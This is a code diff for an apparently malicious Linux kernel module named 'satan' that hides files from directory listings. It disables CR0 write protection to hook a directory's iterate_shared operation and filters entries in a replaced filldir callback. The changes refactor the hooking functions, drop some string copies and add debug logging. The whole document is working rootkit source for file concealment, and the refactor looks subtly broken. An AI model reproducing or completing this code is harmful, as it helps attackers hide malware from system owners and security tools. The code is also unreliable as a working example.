@@ -57,8 +57,8 @@ struct hidden_file {
 };
 static LIST_HEAD(hidden_files);
 
-static int satan_file_hook_parent_dir_iterate_shared(struct hidden_file *f, const char *path);
-static int satan_file_unhook_parent_dir_iterate_shared(const struct hidden_file *f, const char *path);
+static int satan_file_hook_parent_dir_iterate_shared(struct hidden_file *f);
+static int satan_file_unhook_parent_dir_iterate_shared(const struct hidden_file *f);
 
 static struct hidden_file *hidden_files_add(const char *path)
 {
@@ -93,9 +93,6 @@ static int hidden_files_del(const char *path)
         satan_basename(path, basename_buf, BASENAME_BUF_SIZE);
         satan_filename(path, filename_buf, FILENAME_BUF_SIZE);
 
-        strcpy(f->basename, basename_buf);
-        strcpy(f->filename, filename_buf);
-
         list_for_each_safe(p, tmp, &hidden_files) {
                 f = list_entry(p, struct hidden_file, list);
 
@@ -123,9 +120,6 @@ static struct hidden_file *hidden_files_get(const char *path)
         satan_basename(path, basename_buf, BASENAME_BUF_SIZE);
         satan_filename(path, filename_buf, FILENAME_BUF_SIZE);
 
-        strcpy(f->basename, basename_buf);
-        strcpy(f->filename, filename_buf);
-
         list_for_each(p, &hidden_files) {
                 f = list_entry(p, struct hidden_file, list);
 
@@ -151,7 +145,7 @@ int satan_file_exit(void)
 int satan_file_hide(const char *path)
 {
         struct hidden_file *f = hidden_files_add(path);
-        return satan_file_hook_parent_dir_iterate_shared(f, path);
+        return satan_file_hook_parent_dir_iterate_shared(f);
 }
 
 int satan_file_unhide(const char *path)
@@ -163,7 +157,7 @@ int satan_file_unhide(const char *path)
                 return 1;
         }
 
-        if (satan_file_unhook_parent_dir_iterate_shared(f, path) != 0) {
+        if (satan_file_unhook_parent_dir_iterate_shared(f) != 0) {
                 return 1;
         }
 
@@ -175,12 +169,12 @@ int satan_file_unhide(const char *path)
 }
 
 
-static int satan_file_hook_parent_dir_iterate_shared(struct hidden_file *f, const char *path)
+static int satan_file_hook_parent_dir_iterate_shared(struct hidden_file *f)
 { 
-        filp = filp_open(path, O_RDONLY, 0);
+        filp = filp_open(f->basename, O_RDONLY, 0);
 
         if (IS_ERR(filp)) {
-                pr_alert("satan: failed to open %s\n", path);
+                pr_alert("satan: failed to open %s\n", f->basename);
                 return 1;
         } else {
                 f_op = (struct file_operations *) filp->f_op;
@@ -196,12 +190,12 @@ static int satan_file_hook_parent_dir_iterate_shared(struct hidden_file *f, cons
         }
 }
 
-static int satan_file_unhook_parent_dir_iterate_shared(const struct hidden_file *f, const char *path)
+static int satan_file_unhook_parent_dir_iterate_shared(const struct hidden_file *f)
 {
-        filp = filp_open(path, O_RDONLY, 0);
+        filp = filp_open(f->basename, O_RDONLY, 0);
 
         if (IS_ERR(filp)) {
-                pr_alert("satan: failed to open %s:\n", path);
+                pr_alert("satan: failed to open %s:\n", f->basename);
                 return 1;
         } else {
                 CR0_WP_DISABLE {
@@ -228,9 +222,6 @@ static int satan_iterate_shared(struct file *filp, struct dir_context *ctx)
         ret = real_iterate_shared(filp, ctx);
         *(filldir_t *)&ctx->actor = real_filldir;
 
-        // Clear `basename_buf`.
-        memset(basename_buf, 0, BASENAME_BUF_SIZE);
-
         return ret;
 }
 
@@ -246,6 +237,9 @@ static int satan_filldir(struct dir_context *ctx, const char *name, int namlen,
                 // At this point:
                 // 1. Current basename is stored in `basename_buf`.
                 // 2. Current filename is stored in `name`.
+                pr_info("satan: comparing: (%s,%s) and (%s,%s)\n",
+                        f->basename, basename_buf, f->filename, name);
+
                 if (!strcmp(f->basename, basename_buf) && !strcmp(f->filename, name)) {
                         pr_info("satan: hiding: %s", name);
                         return 0;
